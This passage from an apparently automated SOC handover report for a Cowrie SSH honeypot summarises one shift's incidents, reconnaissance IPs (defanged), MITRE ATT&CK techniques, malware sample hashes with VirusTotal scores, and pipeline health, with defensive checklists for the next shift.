| `2026-05-29 06:01:06` | `cowrie.command.failed` |
| `2026-05-29 06:01:07` | `cowrie.log.closed` |
| `2026-05-29 06:01:07` | `cowrie.session.params` |
| `2026-05-29 06:01:07` | `cowrie.command.input` |
| `2026-05-29 06:01:07` | `cowrie.session.file_download` |
| `2026-05-29 06:01:07` | `cowrie.log.closed` |
| `2026-05-29 06:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98729f776b84

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-29 06:01 |
| **Last Seen** | 2026-05-29 06:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 06:01:11` | `cowrie.session.connect` |
| `2026-05-29 06:01:11` | `cowrie.client.version` |
| `2026-05-29 06:01:11` | `cowrie.client.kex` |
| `2026-05-29 06:01:12` | `cowrie.login.success` |
| `2026-05-29 06:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `35.187.37[.]27` | **33** | 2026-05-29 05:02 | 2026-05-29 05:02 | 5m | 4 | `T1110.001` | 🟠 MEDIUM |
| `35.205.204[.]12` | **33** | 2026-05-29 04:16 | 2026-05-29 04:16 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `223.123.38[.]34` | **24** | 2026-05-29 07:07 | 2026-05-29 07:12 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `138.68.20[.]220` | **16** | 2026-05-29 04:02 | 2026-05-29 07:54 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `149.255.39[.]70` | **13** | 2026-05-29 04:10 | 2026-05-29 08:03 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `102.88.137[.]213` | **11** | 2026-05-29 04:24 | 2026-05-29 04:47 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `135.148.33[.]168` | **9** | 2026-05-29 04:09 | 2026-05-29 07:43 | 5m | 0 | `T1592` | 🟢 LOW |
| `45.82.78[.]107` | **4** | 2026-05-29 07:14 | 2026-05-29 07:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.189.25[.]100` | **3** | 2026-05-29 04:53 | 2026-05-29 06:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.251.88[.]213` | **3** | 2026-05-29 07:55 | 2026-05-29 07:56 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `177.11.196[.]79` | **2** | 2026-05-29 04:30 | 2026-05-29 04:37 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `185.247.137[.]66` | **2** | 2026-05-29 06:59 | 2026-05-29 06:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.25[.]231` | **2** | 2026-05-29 08:02 | 2026-05-29 08:03 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.80.83[.]115` | **2** | 2026-05-29 04:11 | 2026-05-29 04:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.242.104[.]81` | 1 | 2026-05-29 04:33 | 2026-05-29 04:34 | 32s | 0 | `T1592` | 🟢 LOW |
| `113.164.234[.]27` | 1 | 2026-05-29 05:17 | 2026-05-29 05:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.203.25[.]201` | 1 | 2026-05-29 03:58 | 2026-05-29 03:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.240.236[.]178` | 1 | 2026-05-29 04:33 | 2026-05-29 04:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.130[.]213` | 1 | 2026-05-29 04:28 | 2026-05-29 04:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `175.100.21[.]20` | 1 | 2026-05-29 05:17 | 2026-05-29 05:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `175.213.118[.]146` | 1 | 2026-05-29 06:30 | 2026-05-29 06:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `179.33.210[.]213` | 1 | 2026-05-29 06:01 | 2026-05-29 06:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.81.86[.]112` | 1 | 2026-05-29 04:03 | 2026-05-29 04:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.73.148[.]12` | 1 | 2026-05-29 07:06 | 2026-05-29 07:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]36` | 1 | 2026-05-29 07:09 | 2026-05-29 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]168` | 1 | 2026-05-29 04:00 | 2026-05-29 04:00 | 16s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]42` | 1 | 2026-05-29 04:18 | 2026-05-29 04:18 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `89.47.53[.]19` | 1 | 2026-05-29 04:20 | 2026-05-29 04:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.242.104[.]81` | ID | PT Lintas Jaringan Nusantara | **100** ⚠️ | 5 |
| `113.164.234[.]27` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 50 |
| `120.203.25[.]201` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `45.82.78[.]107` | SG | Detai Prosperous Technologies Limited | **100** ⚠️ | 50 |
| `206.189.25[.]100` | GB | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `20.80.83[.]115` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `138.68.20[.]220` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `183.81.86[.]112` | VN | FPT Telecom Company | **100** ⚠️ | 7 |
| `185.247.137[.]66` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
| `35.187.37[.]27` | BE | Google LLC | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 38 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (30 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 215 cases |
| Tool 34  | Credential Extractor        | ✅ 43 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 30 filtered (14.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 28 recon entry/entries in table (14 group(s) consolidating 157 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-29T08:05:33Z_
